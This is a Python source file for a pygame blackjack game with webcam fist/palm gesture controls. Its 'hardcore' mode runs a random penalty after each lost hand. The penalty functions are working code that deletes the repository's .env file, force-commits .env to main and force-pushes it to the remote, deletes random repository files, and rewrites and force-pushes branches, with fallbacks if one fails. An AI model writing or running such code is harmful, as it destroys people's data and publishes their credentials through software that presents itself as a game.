#!/usr/bin/env python3
"""
Terminal-launched GUI Blackjack (pygame).

Run:
  python/venv/bin/python python/games/blackjack.py
"""

from __future__ import annotations

import argparse
import os
import random
import subprocess
import sys
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple

import pygame
try:
    from audio_effects import GameAudioEffects
except ImportError:
    from .audio_effects import GameAudioEffects

try:
    import cv2
    import mediapipe as mp
    CV_AVAILABLE = True
except ImportError:
    CV_AVAILABLE = False


WINDOW_WIDTH = 1000
WINDOW_HEIGHT = 700
CARD_WIDTH = 96
CARD_HEIGHT = 140
CARD_GAP = 24
MIN_BET = 10
BET_STEP = 10
DEFAULT_FPS = 60
DEFAULT_BANKROLL = 1000
SUITS = ("S", "H", "D", "C")
RANKS = ("A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K")
SUIT_TO_ASSET = {
    "S": "spades",
    "H": "hearts",
    "D": "diamonds",
    "C": "clubs",
}
DECK_ORIGIN = (WINDOW_WIDTH - 150, 200)
ANIM_DURATION_MS = 260
ANIM_STAGGER_MS = 110

# 1940s-inspired palette
BG_TOP = (16, 48, 35)
BG_BOTTOM = (8, 24, 18)
GOLD = (197, 158, 94)
GOLD_SOFT = (232, 209, 164)
TEXT_IVORY = (246, 236, 208)
PANEL_BG = (20, 58, 42)
BUTTON_BG = (98, 62, 31)
BUTTON_HOVER = (128, 82, 40)
BUTTON_DISABLED = (72, 72, 72)
AUDIO_EFFECTS: Optional[GameAudioEffects] = None

# Penalty countdown colors
PENALTY_RED = (220, 20, 20)
PENALTY_DARK_RED = (120, 10, 10)
PENALTY_FLASH_RED = (255, 50, 50)


class GameMode(str, Enum):
    NORMAL = "normal"
    HARDCORE = "hardcore"


class Phase(str, Enum):
    MODE_SELECT = "MODE_SELECT"
    BETTING = "BETTING"
    PLAYER_TURN = "PLAYER_TURN"
    DEALER_TURN = "DEALER_TURN"
    ROUND_END = "ROUND_END"
    PENALTY_COUNTDOWN = "PENALTY_COUNTDOWN"


class RoundResult(str, Enum):
    NONE = "NONE"
    WIN = "WIN"
    LOSE = "LOSE"
    PUSH = "PUSH"
    BLACKJACK_WIN = "BLACKJACK_WIN"


class PenaltyType(str, Enum):
    DELETE_ENV = "DELETE_ENV"
    FORCE_PUSH_ENV = "FORCE_PUSH_ENV"
    DELETE_RANDOM_LINE = "DELETE_RANDOM_LINE"
    DELETE_RANDOM_FILE = "DELETE_RANDOM_FILE"


def play_result_sound(result: RoundResult) -> None:
    if AUDIO_EFFECTS is None:
        return
    if result in (RoundResult.WIN, RoundResult.BLACKJACK_WIN):
        AUDIO_EFFECTS.play_win()
    elif result == RoundResult.LOSE:
        AUDIO_EFFECTS.play_lose()


@dataclass(frozen=True)
class Card:
    rank: str
    suit: str

    @property
    def image_key(self) -> str:
        suit_name = SUIT_TO_ASSET[self.suit]
        rank_asset = self.rank if self.rank in ("A", "J", "Q", "K", "10") else f"{int(self.rank):02d}"
        return f"card_{suit_name}_{rank_asset}.png"

    def value(self) -> int:
        if self.rank in ("J", "Q", "K"):
            return 10
        if self.rank == "A":
            return 11
        return int(self.rank)


@dataclass
class Deck:
    cards: List[Card] = field(default_factory=list)

    def __post_init__(self) -> None:
        if not self.cards:
            self.rebuild()

    def rebuild(self) -> None:
        self.cards = [Card(rank, suit) for suit in SUITS for rank in RANKS]
        random.shuffle(self.cards)

    def draw(self) -> Card:
        if not self.cards:
            self.rebuild()
        return self.cards.pop()


@dataclass
class Hand:
    cards: List[Card] = field(default_factory=list)

    def add(self, card: Card) -> None:
        self.cards.append(card)

    def value(self) -> Tuple[int, bool]:
        total = sum(card.value() for card in self.cards)
        aces = sum(1 for card in self.cards if card.rank == "A")
        while total > 21 and aces > 0:
            total -= 10
            aces -= 1
        is_soft = any(card.rank == "A" for card in self.cards) and total <= 21 and aces > 0
        return total, is_soft

    def is_blackjack(self) -> bool:
        total, _ = self.value()
        return len(self.cards) == 2 and total == 21

    def is_bust(self) -> bool:
        total, _ = self.value()
        return total > 21


@dataclass
class VisualCard:
    card: Card
    start_pos: Tuple[float, float]
    target_pos: Tuple[float, float]
    start_ms: int
    duration_ms: int = ANIM_DURATION_MS

    def position(self, now_ms: int) -> Tuple[int, int]:
        if now_ms <= self.start_ms:
            return int(self.start_pos[0]), int(self.start_pos[1])
        progress = min(1.0, (now_ms - self.start_ms) / self.duration_ms)
        eased = 1.0 - (1.0 - progress) ** 3
        x = self.start_pos[0] + (self.target_pos[0] - self.start_pos[0]) * eased
        y = self.start_pos[1] + (self.target_pos[1] - self.start_pos[1]) * eased
        return int(x), int(y)


@dataclass
class GameState:
    bankroll: int
    mode: Optional[GameMode] = None
    min_bet: int = MIN_BET
    current_bet: int = MIN_BET
    phase: Phase = Phase.MODE_SELECT
    round_result: RoundResult = RoundResult.NONE
    message: str = "Choose mode to start."
    wins: int = 0
    losses: int = 0
    pushes: int = 0
    player_hand: Hand = field(default_factory=Hand)
    dealer_hand: Hand = field(default_factory=Hand)
    player_visual_cards: List[VisualCard] = field(default_factory=list)
    dealer_visual_cards: List[VisualCard] = field(default_factory=list)
    deck: Deck = field(default_factory=Deck)
    can_start_new_round: bool = True
    rounds_completed: int = 0
    penalty_countdown_start_ms: int = -1
    penalty_countdown_duration_ms: int = 5000
    penalty_triggered: bool = False
    selected_penalty: Optional[PenaltyType] = None

    def reset_for_next_round(self) -> None:
        self.player_hand = Hand()
        self.dealer_hand = Hand()
        self.player_visual_cards = []
        self.dealer_visual_cards = []
        self.round_result = RoundResult.NONE
        if self.mode == GameMode.HARDCORE:
            self.phase = Phase.PLAYER_TURN
            self.message = "Hardcore: camera controls only. Show fist=Hit, palm=Stand."
            self.can_start_new_round = True
            return

        self.phase = Phase.BETTING
        self.message = "Place your bet and click Deal."
        self.can_start_new_round = self.bankroll >= self.min_bet
        if self.bankroll < self.current_bet:
            self.current_bet = max(self.min_bet, (self.bankroll // BET_STEP) * BET_STEP)
        if self.current_bet < self.min_bet and self.bankroll >= self.min_bet:
            self.current_bet = self.min_bet

    @property
    def max_bet(self) -> int:
        return self.bankroll


@dataclass
class Button:
    rect: pygame.Rect
    label: str
    enabled: bool = True

    def draw(self, surface: pygame.Surface, font: pygame.font.Font, hovered: bool = False) -> None:
        if not self.enabled:
            fill = BUTTON_DISABLED
            border = (120, 120, 120)
            text_color = (185, 185, 185)
        else:
            fill = BUTTON_HOVER if hovered else BUTTON_BG
            border = GOLD
            text_color = TEXT_IVORY
        pygame.draw.rect(surface, fill, self.rect, border_radius=8)
        pygame.draw.rect(surface, border, self.rect, width=2, border_radius=8)
        label_surface = font.render(self.label, True, text_color)
        surface.blit(
            label_surface,
            (
                self.rect.centerx - label_surface.get_width() // 2,
                self.rect.centery - label_surface.get_height() // 2,
            ),
        )

    def contains(self, pos: Tuple[int, int]) -> bool:
        return self.enabled and self.rect.collidepoint(pos)


def expected_asset_names() -> List[str]:
    names = [Card(rank, suit).image_key for suit in SUITS for rank in RANKS]
    names.append("card_back.png")
    return names


def load_card_images(base_dir: str) -> Dict[str, pygame.Surface]:
    missing: List[str] = []
    images: Dict[str, pygame.Surface] = {}

    for file_name in expected_asset_names():
        full_path = os.path.join(base_dir, file_name)
        if not os.path.exists(full_path):
            missing.append(file_name)
            continue
        img = pygame.image.load(full_path).convert_alpha()
        images[file_name] = pygame.transform.smoothscale(img, (CARD_WIDTH, CARD_HEIGHT))

    if missing:
        missing_list = ", ".join(sorted(missing))
        raise RuntimeError(
            "Missing card assets in python/assets/cards. "
            f"Required files missing: {missing_list}"
        )

    return images


class GestureController:
    def __init__(self, active: bool) -> None:
        self.enabled = False
        self.cap = None
        self.hands = None
        self.drawer = None
        self.last_action_ms = {"hit": -9999, "stand": -9999}
        self.hit_latched = False
        self.stand_latched = False
        self.activated = True
        self.started_at_ms = -1
        self.initial_cooldown_ms = 3000
        self.action_cooldown_ms = 3000
        self.gesture_stability = {"hit": 0, "stand": 0}
        self.stability_threshold = 3
        self.current_gesture = "INITIALIZING"

        if not active:
            return

        if not CV_AVAILABLE:
            return

        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return

        self.cap = cap
        self.drawer = mp.solutions.drawing_utils
        self.hands = mp.solutions.hands.Hands(
            static_image_mode=False,
            max_num_hands=2,
            min_detection_confidence=0.7,
            min_tracking_confidence=0.7,
        )
        self.enabled = True

    def close(self) -> None:
        if self.cap is not None:
            self.cap.release()
        if CV_AVAILABLE:
            cv2.destroyAllWindows()
        self.enabled = False

    def _cooldown_ready(self, action: str, now_ms: int, cooldown_ms: int) -> bool:
        return now_ms - self.last_action_ms[action] >= cooldown_ms

    def _is_finger_extended(self, lm, tip_idx: int, pip_idx: int) -> bool:
        return lm[tip_idx].y < lm[pip_idx].y

    def _is_flat_palm(self, lm) -> bool:
        return (
            self._is_finger_extended(lm, 8, 6) and
            self._is_finger_extended(lm, 12, 10) and
            self._is_finger_extended(lm, 16, 14) and
            self._is_finger_extended(lm, 20, 18)
        )

    def _is_fist(self, lm) -> bool:
        folded_fingers = (
            lm[8].y > lm[6].y and
            lm[12].y > lm[10].y and
            lm[16].y > lm[14].y and
            lm[20].y > lm[18].y
        )
        thumb_folded = lm[4].y > lm[3].y
        return folded_fingers and thumb_folded

    def _increment_stability(self, gesture: str) -> bool:
        self.gesture_stability[gesture] = min(
            self.stability_threshold,
            self.gesture_stability[gesture] + 1,
        )
        return self.gesture_stability[gesture] >= self.stability_threshold

    def _reset_stability(self, gesture: str) -> None:
        self.gesture_stability[gesture] = 0

    def _reset_all_stability(self) -> None:
        for key in self.gesture_stability:
            self.gesture_stability[key] = 0

    def _draw_feedback(self, frame, message: str, progress: Optional[float] = None) -> None:
        h, w, _ = frame.shape
        overlay = frame.copy()
        cv2.rectangle(overlay, (0, 0), (w, 84), (0, 0, 0), -1)
        cv2.addWeighted(overlay, 0.58, frame, 0.42, 0, frame)

        color = (0, 220, 0) if self.activated else (80, 160, 255)
        cv2.putText(frame, message, (10, 30), cv2.FONT_HERSHEY_SIMPLEX, 0.68, color, 2)
        cv2.putText(
            frame,
            "Controls: FIST=Hit, PALM=Stand",
            (10, 58),
            cv2.FONT_HERSHEY_SIMPLEX,
            0.50,
            (220, 220, 220),
            1,
        )

        if progress is not None:
            bar_w = int(w * 0.55)
            bar_x = w - bar_w - 16
            bar_y = 14
            bar_h = 18
            cv2.rectangle(frame, (bar_x, bar_y), (bar_x + bar_w, bar_y + bar_h), (60, 60, 60), -1)
            filled = int(bar_w * max(0.0, min(1.0, progress)))
            cv2.rectangle(frame, (bar_x, bar_y), (bar_x + filled, bar_y + bar_h), (0, 210, 120), -1)

    def poll_action(self, allow_split: bool) -> Optional[str]:
        if not self.enabled or self.cap is None or self.hands is None:
            return None

        now_ms = pygame.time.get_ticks()
        if self.started_at_ms < 0:
            self.started_at_ms = now_ms

        ok, frame = self.cap.read()
        if not ok:
            return None

        frame = cv2.flip(frame, 1)
        rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = self.hands.process(rgb)

        if not results.multi_hand_landmarks:
            self.hit_latched = False
            self.stand_latched = False
            self._reset_all_stability()
            self.current_gesture = "No hands"
            warmup_remaining = max(0.0, (self.initial_cooldown_ms - (now_ms - self.started_at_ms)) / 1000.0)
            if warmup_remaining > 0:
                self._draw_feedback(frame, f"Warming up... {warmup_remaining:.1f}s")
            else:
                self._draw_feedback(frame, "Ready - show fist or palm")
            cv2.imshow("Blackjack Gesture Cam", frame)
            cv2.waitKey(1)
            return None

        action: Optional[str] = None
        hand_landmarks = [h.landmark for h in results.multi_hand_landmarks]

        for hand in results.multi_hand_landmarks:
            self.drawer.draw_landmarks(frame, hand, mp.solutions.hands.HAND_CONNECTIONS)

        warmup_remaining = max(0.0, (self.initial_cooldown_ms - (now_ms - self.started_at_ms)) / 1000.0)
        if warmup_remaining > 0:
            self._draw_feedback(frame, f"Warming up... {warmup_remaining:.1f}s")
            cv2.imshow("Blackjack Gesture Cam", frame)
            cv2.waitKey(1)
            return None

        fist_any = any(self._is_fist(lm) for lm in hand_landmarks)
        flat_palm_any = any(self._is_flat_palm(lm) for lm in hand_landmarks)
        detected_gesture = "Ready"
        hit_active = fist_any
        stand_active = flat_palm_any

        if hit_active:
            hit_stable = self._increment_stability("hit")
        else:
            hit_stable = False
            self._reset_stability("hit")

        if stand_active:
            stand_stable = self._increment_stability("stand")
        else:
            stand_stable = False
            self._reset_stability("stand")

        if (
            hit_stable
            and not self.hit_latched
            and self._cooldown_ready("hit", now_ms, self.action_cooldown_ms)
        ):
            action = "hit"
            self.last_action_ms["hit"] = now_ms
            self.hit_latched = True
            detected_gesture = "HIT (fist)"
        elif (
            stand_stable
            and not self.stand_latched
            and self._cooldown_ready("stand", now_ms, self.action_cooldown_ms)
        ):
            action = "stand"
            self.last_action_ms["stand"] = now_ms
            self.stand_latched = True
            detected_gesture = "STAND"

        if not fist_any:
            self.hit_latched = False
        if not flat_palm_any:
            self.stand_latched = False

        last_action = max(self.last_action_ms["hit"], self.last_action_ms["stand"])
        if last_action < 0:
            cooldown_remaining = 0.0
        else:
            cooldown_remaining = max(0.0, (self.action_cooldown_ms - (now_ms - last_action)) / 1000.0)

        if action is None:
            max_stability = max(self.gesture_stability.values())
            if max_stability > 0:
                self.current_gesture = f"{detected_gesture} ({max_stability}/{self.stability_threshold})"
            else:
                self.current_gesture = "Ready"
        else:
            self.current_gesture = f"{detected_gesture} triggered"

        self._draw_feedback(
            frame,
            f"ACTIVE - {self.current_gesture} | fist={fist_any} palm={flat_palm_any} cd={cooldown_remaining:.1f}s",
        )
        cv2.imshow("Blackjack Gesture Cam", frame)
        cv2.waitKey(1)
        return action


def hand_anchor(owner: str) -> Tuple[int, int]:
    if owner == "dealer":
        return 40, 200
    return 40, 430


def add_visual_card(
    state: GameState,
    owner: str,
    card: Card,
    now_ms: int,
    delay_ms: int = 0,
) -> None:
    if owner == "dealer":
        idx = len(state.dealer_hand.cards) - 1
        target_x, target_y = hand_anchor("dealer")
        target = (target_x + idx * (CARD_WIDTH + CARD_GAP), target_y)
        state.dealer_visual_cards.append(
            VisualCard(card=card, start_pos=DECK_ORIGIN, target_pos=target, start_ms=now_ms + delay_ms)
        )
    else:
        idx = len(state.player_hand.cards) - 1
        target_x, target_y = hand_anchor("player")
        target = (target_x + idx * (CARD_WIDTH + CARD_GAP), target_y)
        state.player_visual_cards.append(
            VisualCard(card=card, start_pos=DECK_ORIGIN, target_pos=target, start_ms=now_ms + delay_ms)
        )


def deal_initial_cards(state: GameState, now_ms: int) -> None:
    state.player_hand = Hand()
    state.dealer_hand = Hand()
    state.player_visual_cards = []
    state.dealer_visual_cards = []

    # Deal order: player, dealer, player, dealer (staggered animation)
    card = state.deck.draw()
    state.player_hand.add(card)
    add_visual_card(state, "player", card, now_ms, delay_ms=0)

    card = state.deck.draw()
    state.dealer_hand.add(card)
    add_visual_card(state, "dealer", card, now_ms, delay_ms=ANIM_STAGGER_MS)

    card = state.deck.draw()
    state.player_hand.add(card)
    add_visual_card(state, "player", card, now_ms, delay_ms=ANIM_STAGGER_MS * 2)

    card = state.deck.draw()
    state.dealer_hand.add(card)
    add_visual_card(state, "dealer", card, now_ms, delay_ms=ANIM_STAGGER_MS * 3)


def start_hardcore_round(state: GameState, now_ms: int) -> None:
    state.player_hand = Hand()
    state.dealer_hand = Hand()
    state.player_visual_cards = []
    state.dealer_visual_cards = []
    state.round_result = RoundResult.NONE
    state.phase = Phase.PLAYER_TURN
    state.message = "Hardcore: camera controls only. Show fist=Hit, palm=Stand."

    while True:
        deal_initial_cards(state, now_ms=now_ms)
        player_bj = state.player_hand.is_blackjack()
        dealer_bj = state.dealer_hand.is_blackjack()
        if player_bj and dealer_bj:
            state.pushes += 1
            state.message = "Hardcore push on deal. Redealing..."
            continue
        if player_bj:
            settle_round(state, RoundResult.BLACKJACK_WIN, now_ms=now_ms)
        elif dealer_bj:
            settle_round(state, RoundResult.LOSE, now_ms=now_ms)
        else:
            state.message = "Hardcore: camera controls only. Show fist=Hit, palm=Stand."
        return


def settle_round(state: GameState, result: RoundResult, now_ms: int) -> None:
    if state.mode == GameMode.HARDCORE:
        if result == RoundResult.PUSH:
            state.pushes += 1
            state.message = "Hardcore push. Redealing..."
            start_hardcore_round(state, now_ms=now_ms)
            return

        state.round_result = result
        play_result_sound(result)
        state.rounds_completed += 1

        # Trigger penalty countdown on loss
        if result == RoundResult.LOSE:
            state.phase = Phase.PENALTY_COUNTDOWN
            state.penalty_countdown_start_ms = now_ms
            state.penalty_triggered = False
            state.selected_penalty = select_random_penalty()
            state.losses += 1
            state.message = "HARDCORE PENALTY ACTIVATED"
            state.can_start_new_round = False
            return

        # Handle wins
        state.phase = Phase.ROUND_END
        if result == RoundResult.BLACKJACK_WIN:
            state.wins += 1
            state.message = "Hardcore clear: BLACKJACK."
        elif result == RoundResult.WIN:
            state.wins += 1
            state.message = "Hardcore clear: You win."
        state.can_start_new_round = True
        return

    bet = state.current_bet
    state.round_result = result
    play_result_sound(result)
    state.phase = Phase.ROUND_END
    if result == RoundResult.WIN:
        state.bankroll += bet
        state.wins += 1
        state.message = f"You win +{bet}."
    elif result == RoundResult.BLACKJACK_WIN:
        payout = (bet * 3) // 2
        state.bankroll += payout
        state.wins += 1
        state.message = f"Blackjack! You win +{payout}."
    elif result == RoundResult.LOSE:
        state.bankroll -= bet
        state.losses += 1
        state.message = f"You lose -{bet}."
    elif result == RoundResult.PUSH:
        state.pushes += 1
        state.message = "Push. Bet returned."

    state.can_start_new_round = state.bankroll >= state.min_bet
    if not state.can_start_new_round:
        state.message += " Game over: bankroll below minimum bet."


def execute_hardcore_penalty() -> Tuple[bool, str]:
    """
    Delete .env file from repository root as hardcore mode penalty.

    Returns:
        Tuple of (success, message)
        - success: True if file was deleted or didn't exist
        - message: Description of what happened
    """
    env_path = os.path.join(os.path.dirname(__file__), "..", "..", ".env")
    env_path = os.path.normpath(env_path)

    if not os.path.exists(env_path):
        msg = f"PENALTY TRIGGERED: No .env file found at {env_path}"
        print(msg, file=sys.stderr)
        return True, "No .env file to delete"

    try:
        os.remove(env_path)
        msg = f"HARDCORE PENALTY EXECUTED: Deleted {env_path}"
        print(msg, file=sys.stderr)
        return True, "FILE DELETED"
    except PermissionError:
        msg = f"PENALTY FAILED: Permission denied for {env_path}"
        print(msg, file=sys.stderr)
        return False, "DELETION FAILED (Permission Error)"
    except Exception as e:
        msg = f"PENALTY FAILED: {type(e).__name__}: {e}"
        print(msg, file=sys.stderr)
        return False, f"DELETION FAILED ({type(e).__name__})"


def penalty_force_push_env() -> Tuple[bool, str]:
    """Force push .env file to main branch"""
    try:
        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))
        env_path = os.path.join(repo_root, ".env")

        # Check if .env exists
        if not os.path.exists(env_path):
            return False, "NO .ENV TO PUSH"

        # Read .env content before switching branches
        with open(env_path, 'r', encoding='utf-8') as f:
            env_content = f.read()

        # Get current branch to restore later
        current_branch = subprocess.run(
            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            text=True,
            timeout=10
        ).stdout.strip()

        # Stash uncommitted changes to avoid checkout conflicts
        stash_result = subprocess.run(
            ["git", "stash", "push", "-m", "PENALTY: Temporary stash"],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        has_stash = "No local changes to save" not in stash_result.stdout

        # Switch to main branch
        result = subprocess.run(
            ["git", "checkout", "main"],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            print(f"CHECKOUT FAILED: {result.stderr}", file=sys.stderr)
            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)

        # Write .env content on main branch
        with open(env_path, 'w', encoding='utf-8') as f:
            f.write(env_content)

        # Git add .env (force add even if in .gitignore)
        result = subprocess.run(
            ["git", "add", "--force", ".env"],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            print(f"GIT ADD FAILED: {result.stderr}", file=sys.stderr)
            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)

        # Commit (allow empty in case no changes)
        result = subprocess.run(
            ["git", "commit", "--allow-empty", "-m", "HARDCORE PENALTY: Force committing .env"],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            print(f"COMMIT FAILED: {result.stderr}", file=sys.stderr)
            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)

        # Force push main to origin/main
        result = subprocess.run(
            ["git", "push", "origin", "main", "--force"],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            print(f"PUSH FAILED: {result.stderr}", file=sys.stderr)
            raise subprocess.CalledProcessError(result.returncode, result.args, result.stdout, result.stderr)

        # Switch back to original branch
        result = subprocess.run(
            ["git", "checkout", current_branch],
            cwd=repo_root,
            capture_output=True,
            text=True,
            timeout=10
        )
        if result.returncode != 0:
            print(f"CHECKOUT BACK FAILED: {result.stderr}", file=sys.stderr)
            # Don't raise here - we already pushed, just warn

        # Restore stashed changes if we stashed anything
        if has_stash:
            result = subprocess.run(
                ["git", "stash", "pop"],
                cwd=repo_root,
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode != 0:
                print(f"STASH POP FAILED: {result.stderr}", file=sys.stderr)
                # Don't raise here either

        msg = f"HARDCORE PENALTY: Force pushed .env to main"
        print(msg, file=sys.stderr)
        return True, ".ENV PUSHED TO MAIN"

    except subprocess.TimeoutExpired:
        msg = "Git operation timed out"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, "GIT TIMEOUT"
    except subprocess.CalledProcessError as e:
        msg = f"Git command failed with code {e.returncode}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"GIT FAILED: {e.returncode}"
    except Exception as e:
        msg = f"{type(e).__name__}: {e}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"GIT ERROR: {type(e).__name__}"


def penalty_delete_random_line() -> Tuple[bool, str]:
    """Delete a random line from sample penalty file (safe for testing)"""
    try:
        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))

        # Check for penalty_test_* files first (safe mode)
        penalty_test_files = []
        for file in os.listdir(repo_root):
            if file.startswith("penalty_test_") and os.path.isfile(os.path.join(repo_root, file)):
                penalty_test_files.append(file)

        # If penalty_test files exist, use one of those
        if penalty_test_files:
            selected_file = random.choice(penalty_test_files)
            sample_file = os.path.join(repo_root, selected_file)
            print(f"SAFE MODE: Using penalty_test file: {selected_file}", file=sys.stderr)
        else:
            # Use PENALTY_SAMPLE.txt as fallback
            sample_file = os.path.join(repo_root, "PENALTY_SAMPLE.txt")

            # Create sample file if it doesn't exist
            if not os.path.exists(sample_file):
                with open(sample_file, 'w', encoding='utf-8') as f:
                    f.write("Line 1: This is a sample line\n")
                    f.write("Line 2: Another sample line\n")
                    f.write("Line 3: Yet another line\n")
                    f.write("Line 4: Sample data here\n")
                    f.write("Line 5: More sample content\n")
                    f.write("Line 6: Last sample line\n")

        # Read file
        with open(sample_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        if not lines:
            return False, "SAMPLE FILE EMPTY"

        # Pick random line and delete it
        line_idx = random.randint(0, len(lines) - 1)
        deleted_line = lines.pop(line_idx).strip()

        # Write back
        with open(sample_file, 'w', encoding='utf-8') as f:
            f.writelines(lines)

        # Get current branch
        current_branch = subprocess.run(
            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            text=True,
            timeout=10
        ).stdout.strip()

        # Get filename for git operations
        filename = os.path.basename(sample_file)

        # Git add the modified file
        subprocess.run(
            ["git", "add", filename],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        # Commit
        subprocess.run(
            ["git", "commit", "-m", f"HARDCORE PENALTY: Deleted line {line_idx + 1} from {filename}"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        # Force push current branch to origin
        subprocess.run(
            ["git", "push", "origin", current_branch, "--force"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        msg = f"HARDCORE PENALTY: Deleted line {line_idx + 1} from {filename} and force pushed to {current_branch}"
        print(msg, file=sys.stderr)
        return True, f"DELETED LINE {line_idx + 1} & PUSHED"

    except subprocess.TimeoutExpired:
        msg = "Git operation timed out"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, "GIT TIMEOUT"
    except subprocess.CalledProcessError as e:
        msg = f"Git command failed with code {e.returncode}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"GIT FAILED: {e.returncode}"
    except Exception as e:
        msg = f"{type(e).__name__}: {e}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"DELETION FAILED: {type(e).__name__}"


def penalty_delete_random_file() -> Tuple[bool, str]:
    """Delete a random file from repository and force push"""
    try:
        repo_root = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", ".."))

        # Check for penalty_test_* files first (safe mode)
        penalty_test_files = []
        for file in os.listdir(repo_root):
            if file.startswith("penalty_test_") and os.path.isfile(os.path.join(repo_root, file)):
                penalty_test_files.append(file)

        # If penalty_test files exist, only use those
        if penalty_test_files:
            file_to_delete = random.choice(penalty_test_files)
            print(f"SAFE MODE: Using penalty_test file: {file_to_delete}", file=sys.stderr)
        else:
            # Original behavior: collect all files
            excluded_dirs = {
                '.git', 'node_modules', '__pycache__', '.venv', 'venv',
                '.vscode', '.idea', 'dist', 'out', '.vscode-test'
            }

            all_files = []
            for root, dirs, files in os.walk(repo_root):
                # Remove excluded directories from traversal
                dirs[:] = [d for d in dirs if d not in excluded_dirs]

                for file in files:
                    file_path = os.path.join(root, file)
                    # Get relative path from repo root
                    rel_path = os.path.relpath(file_path, repo_root)
                    # Exclude this script itself
                    if rel_path != os.path.relpath(__file__, repo_root):
                        all_files.append(rel_path)

            if not all_files:
                return False, "NO FILES TO DELETE"

            # Pick random file
            file_to_delete = random.choice(all_files)
        full_path = os.path.join(repo_root, file_to_delete)

        # Delete the file
        os.remove(full_path)

        # Get current branch
        current_branch = subprocess.run(
            ["git", "rev-parse", "--abbrev-ref", "HEAD"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            text=True,
            timeout=10
        ).stdout.strip()

        # Git add the deletion
        subprocess.run(
            ["git", "add", file_to_delete],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        # Commit
        subprocess.run(
            ["git", "commit", "-m", f"HARDCORE PENALTY: Deleted {file_to_delete}"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        # Force push current branch to origin
        subprocess.run(
            ["git", "push", "origin", current_branch, "--force"],
            cwd=repo_root,
            capture_output=True,
            check=True,
            timeout=10
        )

        msg = f"HARDCORE PENALTY: Deleted {file_to_delete} and force pushed"
        print(msg, file=sys.stderr)
        return True, f"DELETED {os.path.basename(file_to_delete)}"

    except subprocess.TimeoutExpired:
        msg = "Git operation timed out"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, "GIT TIMEOUT"
    except subprocess.CalledProcessError as e:
        msg = f"Git command failed with code {e.returncode}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"GIT FAILED: {e.returncode}"
    except Exception as e:
        msg = f"{type(e).__name__}: {e}"
        print(f"PENALTY FAILED: {msg}", file=sys.stderr)
        return False, f"DELETION FAILED: {type(e).__name__}"


def select_random_penalty() -> PenaltyType:
    """Randomly select a penalty from the pool"""
    penalties = [
        PenaltyType.DELETE_ENV,
        PenaltyType.FORCE_PUSH_ENV,
        PenaltyType.DELETE_RANDOM_LINE,
        PenaltyType.DELETE_RANDOM_FILE
    ]
    return random.choice(penalties)


def execute_selected_penalty(penalty_type: PenaltyType) -> Tuple[bool, str]:
    """
    Execute the selected penalty with fallback logic.
    If the selected penalty fails, try others in order.
    """
    # Map penalty types to their functions
    penalty_functions = {
        PenaltyType.DELETE_ENV: execute_hardcore_penalty,
        PenaltyType.FORCE_PUSH_ENV: penalty_force_push_env,
        PenaltyType.DELETE_RANDOM_LINE: penalty_delete_random_line,
        PenaltyType.DELETE_RANDOM_FILE: penalty_delete_random_file,
    }

    # Try primary penalty first
    primary_func = penalty_functions[penalty_type]
    success, message = primary_func()

    if success:
        return True, message

    # Fallback: try other penalties in order
    print(f"Primary penalty failed, trying fallbacks...", file=sys.stderr)
    for fallback_type, fallback_func in penalty_functions.items():
        if fallback_type == penalty_type:
            continue  # Skip the one we just tried

        success, message = fallback_func()
        if success:
            return True, f"{message} (FALLBACK)"

    # All penalties failed
    return False, "ALL PENALTIES FAILED"


def get_penalty_description(penalty_type: PenaltyType) -> str:
    """Get human-readable description for countdown display"""
    descriptions = {
        PenaltyType.DELETE_ENV: "Deleting .env file...",
        PenaltyType.FORCE_PUSH_ENV: "Force pushing .env to main...",
        PenaltyType.DELETE_RANDOM_LINE: "Deleting random line from random file...",
        PenaltyType.DELETE_RANDOM_FILE: "Deleting random file from repository...",
    }
    return descriptions.get(penalty_type, "Unknown penalty...")


def resolve_natural_blackjacks(state: GameState) -> bool:
    player_bj = state.player_hand.is_blackjack()
    dealer_bj = state.dealer_hand.is_blackjack()
    if player_bj and dealer_bj:
        settle_round(state, RoundResult.PUSH, now_ms=pygame.time.get_ticks())
        return True
    if player_bj:
        settle_round(state, RoundResult.BLACKJACK_WIN, now_ms=pygame.time.get_ticks())
        return True
    if dealer_bj:
        settle_round(state, RoundResult.LOSE, now_ms=pygame.time.get_ticks())
        return True
    return False


